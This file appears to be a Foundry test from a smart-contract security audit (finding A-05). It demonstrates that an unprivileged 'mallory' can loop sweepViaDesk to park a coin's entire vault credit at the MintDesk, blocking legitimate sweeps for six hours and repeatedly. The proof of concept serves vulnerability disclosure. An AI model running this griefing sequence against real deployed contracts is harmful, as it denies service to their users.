// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AuditABase} from "./AuditABase.sol";
import {SweepVault} from "../../../src/SweepVault.sol";
import {FrogCurve} from "../../../src/curve/FrogCurve.sol";
import {CurveToken} from "../../../src/curve/CurveToken.sol";
import {MintDesk} from "../../../src/curve/MintDesk.sol";

/// A-05: "MintDesk OFF" is enforced only by the canister never calling `fulfill`. On chain the desk is wired into every vault and
/// `sweepViaDesk` is anyone's, so a stranger can park a coin's whole vault credit at the desk, one cap at a time, for the TTL (6 h),
/// and do it again after `collectDesk` — starving that coin's sweeps (RAFFLE/BURN, Phase-1 ON) for as long as they keep at it.
contract DeskOffTest is AuditABase {
    function test_A05_strangerParksVaultCreditAtTheDesk() public {
        (FrogCurve c, CurveToken tok) = _launch(SweepVault.Policy.RAFFLE, false);
        // trading fees → the coin's vault credit
        vm.deal(buyer, 10 ether);
        vm.prank(buyer);
        c.buy{value: 3 ether}(0);                               // inside the launch fee: most of it goes to the vault
        c.flushVaultFees();
        uint256 credit = curveRaffle.credit(address(tok));
        assertGt(credit, 1 ether);

        // mallory, with no role, moves it all to the desk in cap-sized requests
        uint256 cap = curveRaffle.cap();
        vm.startPrank(mallory);
        uint256 n;
        while (curveRaffle.credit(address(tok)) != 0) {
            uint256 amt = curveRaffle.credit(address(tok)) < cap ? curveRaffle.credit(address(tok)) : cap;
            curveRaffle.sweepViaDesk(address(tok), amt);
            n++;
        }
        vm.stopPrank();
        emit log_named_uint("desk requests opened by a stranger", n);
        assertEq(curveRaffle.credit(address(tok)), 0, "nothing left for a sweep");

        // a legitimate sweep is now refused for lack of credit
        vm.expectRevert(SweepVault.Insufficient.selector);
        curveRaffle.sweep(address(tok), 0.1 ether, "", 1);

        // after the TTL anyone collects it back, and mallory can repeat
        _skipBoth(6 hours + 1 minutes);
        for (uint256 i = 0; i < n; ++i) curveRaffle.collectDesk(i);
        assertEq(curveRaffle.credit(address(tok)), credit);
    }
}
